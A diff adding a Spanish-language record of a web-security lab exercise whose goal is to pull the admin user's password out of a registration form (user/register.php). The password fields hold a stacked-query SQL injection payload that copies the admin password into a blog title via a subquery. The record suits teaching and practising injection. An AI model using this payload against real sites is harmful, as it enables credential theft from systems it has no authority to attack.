@@ -1,0 +1,19 @@
+Ejercicio: 8
+
+Objetivo:
+    Recuperar mediante una subquery la clave del usuario admin
+
+Punto de entrada:
+    user/register.php
+
+Datos:
+    user: q
+    name: q
+    Blog title: q
+    password:  f',time()); insert into blogs (id, title, user_id, created_at) values (null, (select password from users where user='admin'), 1, time());--
+    password2: f',time()); insert into blogs (id, title, user_id, created_at) values (null, (select password from users where user='admin'), 1, time());--
+URL:
+    /index.php?infoMessage=User+%27a%27+successfully+registerred
+
+Identificador:
+    20210427-115025 05b5a11459009085041881b1bb297cbe
